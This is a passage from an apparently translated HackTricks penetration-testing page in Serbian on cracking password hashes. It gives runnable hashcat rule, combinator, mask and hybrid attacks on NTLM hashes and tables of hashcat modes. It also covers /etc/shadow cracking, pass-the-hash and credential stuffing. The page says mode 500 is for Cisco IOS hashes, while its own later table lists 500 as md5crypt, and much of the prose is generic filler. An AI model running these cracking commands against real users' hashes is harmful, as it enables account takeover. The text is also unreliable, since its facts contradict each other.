**Hashcat** već dolazi sa **folderom koji sadrži pravila**, ali možete pronaći [**ostala interesantna pravila ovde**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Napad kombinovanjem liste reči**

Moguće je **kombinovati 2 liste reči u jednu** pomoću hashcat alata.\
Ako prva lista sadrži reč **"hello"**, a druga lista sadrži 2 linije sa rečima **"world"** i **"earth"**, generisaće se reči `helloworld` i `helloearth`.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Napad maskom** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Napad sa kombinacijom liste reči + maska (`-a 6`) / Maska + lista reči (`-a 7`)
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Hashcat režimi

Hashcat je moćan alat za dešifrovanje lozinki koji podržava različite režime rada. Svaki režim ima svoju specifičnu namenu i koristi se za različite vrste napada. Evo nekoliko najčešće korišćenih režima:

- **Režim 0**: Režim za dešifrovanje MD5 hashova.
- **Režim 1000**: Režim za dešifrovanje NTLM hashova.
- **Režim 2500**: Režim za dešifrovanje WPA/WPA2 hashova.
- **Režim 3000**: Režim za dešifrovanje LM hashova.
- **Režim 500**: Režim za dešifrovanje Cisco IOS hashova.
- **Režim 1800**: Režim za dešifrovanje SHA-512(Unix) hashova.

Ovo su samo neki od mnogih režima koje Hashcat podržava. Važno je odabrati odgovarajući režim u skladu sa vrstom hasha koji pokušavate da dešifrujete.
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Pucanje Linux heševa - fajl /etc/shadow

## Uvod

Fajl `/etc/shadow` je sistemski fajl u Linux operativnom sistemu koji sadrži heširane lozinke korisnika. Kada se korisnik prijavi na sistem, unesena lozinka se hešira i upoređuje sa vrednošću heša iz `/etc/shadow` fajla. Ako se heševi poklapaju, korisnik je uspešno autentifikovan.

U ovom odeljku ćemo se fokusirati na tehniku pucanja Linux heševa iz `/etc/shadow` fajla.

## Metode pucanja Linux heševa

### 1. Rečnik napad

Rečnik napad je tehnika koja se zasniva na pokušaju svake reči iz rečnika kao potencijalne lozinke. Ova metoda je efikasna kada korisnici koriste slabe lozinke koje se mogu naći u rečnicima.

Da biste izvršili rečnik napad, možete koristiti alate kao što su `John the Ripper` ili `Hashcat`. Ovi alati omogućavaju brzo i efikasno pucanje heševa koristeći rečnike sa predefinisanim lozinkama.

### 2. Brute force napad

Brute force napad je tehnika koja pokušava sve moguće kombinacije karaktera kako bi pronašla tačnu lozinku. Ova metoda je vremenski zahtevna, ali može biti uspešna čak i kada korisnici koriste jake lozinke.

Da biste izvršili brute force napad, možete koristiti alate kao što su `John the Ripper`, `Hashcat` ili `Hydra`. Ovi alati omogućavaju automatsko generisanje i testiranje svih mogućih kombinacija karaktera.

### 3. Rainbow table napad

Rainbow table napad je tehnika koja se zasniva na prethodno izračunatim heševima i njihovim odgovarajućim lozinkama. Ova metoda je efikasna kada se korisnici oslanjaju na slabe heš algoritme ili koriste česte lozinke.

Da biste izvršili rainbow table napad, možete koristiti alate kao što su `John the Ripper` ili `Hashcat`. Ovi alati omogućavaju upotrebu prethodno generisanih rainbow tabela za brzo pucanje heševa.

## Zaključak

Pucanje Linux heševa iz `/etc/shadow` fajla može biti izazovno, ali korišćenje odgovarajućih tehnika i alata može olakšati ovaj proces. Važno je napomenuti da je pucanje heševa bez dozvole vlasnika sistema ilegalno i može imati ozbiljne pravne posledice. Ove tehnike treba koristiti samo u okviru zakonskih i etičkih granica, kao deo penetracionog testiranja ili zaštite sistema.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
Razbijanje Windows heševa

---

### NTLM Hash

NTLM heš je jedan od najčešće korišćenih heševa za autentifikaciju u Windows okruženju. Može se koristiti za pokušaj preuzimanja lozinke korisnika.

#### Brute Force napad

Brute Force napad je tehnika koja se koristi za pokušaj otkrivanja lozinke tako što se sistematski isprobavaju sve moguće kombinacije. Za NTLM heš, možete koristiti alate kao što su Hashcat ili John the Ripper za izvršavanje Brute Force napada.

#### Rainbow tablice

Rainbow tablice su prethodno izračunate tablice koje sadrže hešove i odgovarajuće lozinke. Možete koristiti alate kao što su RainbowCrack ili Ophcrack za pretragu ovih tablica kako biste pronašli odgovarajuću lozinku za NTLM heš.

### LM Hash

LM heš je stariji heš koji se koristi u Windows operativnim sistemima. On je manje siguran od NTLM heša i može se relativno lako razbiti.

#### Brute Force napad

Brute Force napad se takođe može koristiti za razbijanje LM heša. Alati kao što su Hashcat ili John the Ripper mogu se koristiti za izvršavanje ovog napada.

#### Rainbow tablice

Takođe možete koristiti RainbowCrack ili Ophcrack za pretragu rainbow tablica kako biste pronašli odgovarajuću lozinku za LM heš.

### Pass the Hash

Pass the Hash je tehnika koja omogućava napadaču da se autentifikuje na sistem koristeći samo heš lozinke, umesto da zna pravu lozinku. Ova tehnika se može koristiti za pristup sistemu bez potrebe za razbijanjem heša.

### Credential Stuffing

Credential Stuffing je tehnika koja se koristi za automatizovano testiranje velikog broja korisničkih imena i lozinki na različitim veb lokacijama. Ova tehnika se može koristiti za pokušaj pronalaženja korisničkih imena i lozinki koje se koriste na Windows sistemima.

### Dictionary Attack

Dictionary Attack je tehnika koja se koristi za pokušaj pronalaženja lozinke koristeći predefinisani rečnik lozinki. Ova tehnika može biti efikasna ako korisnik koristi slabu lozinku koja se nalazi u rečniku.

### Hybrid Attack

Hybrid Attack je kombinacija Brute Force napada i Dictionary Attack napada. Ova tehnika omogućava isprobavanje svih mogućih kombinacija lozinki iz rečnika, uključujući i varijacije koje se dobijaju primenom Brute Force napada.

### Social Engineering

Social Engineering je tehnika koja se koristi za manipulaciju ljudima kako bi otkrili svoje lozinke ili druge osetljive informacije. Ova tehnika može biti efikasna za dobijanje pristupa Windows sistemima ako se korisnici prevare da otkriju svoje lozinke.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
Razbijanje uobičajenih heševa aplikacija

Uobičajeni heševi aplikacija često se koriste za čuvanje lozinki i drugih osetljivih informacija. Kako biste pristupili tim informacijama, možete pokušati da razbijete heš. Postoji nekoliko metoda koje možete koristiti za to.

1. Rečnik napada: Ova metoda uključuje upotrebu rečnika sa velikim brojem poznatih lozinki i njihovih heševa. Alati poput Hashcat-a mogu vam pomoći da brzo i efikasno izvršite ovu vrstu napada.

2. Brute force napad: Ova metoda uključuje pokušaj svih mogućih kombinacija lozinki dok ne pronađete odgovarajući heš. Ovo može biti vremenski zahtevno, ali može biti uspešno ako je lozinka slaba ili kratka.

3. Rainbow tablice: Ove tablice sadrže prethodno izračunate heševe za veliki broj mogućih lozinki. Možete koristiti alate poput RainbowCrack-a za pretragu ovih tablica i pronalaženje odgovarajućeg heša.

4. GPU ubrzanje: Korišćenje grafičkih procesora (GPU) može značajno ubrzati proces razbijanja heševa. Alati poput Hashcat-a mogu iskoristiti snagu GPU-a za brže izvršavanje napada.

Važno je napomenuti da je razbijanje heševa nezakonito ako nemate dozvolu vlasnika sistema. Uvek se pridržavajte zakona i etičkih smernica prilikom izvođenja ovih tehnika.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
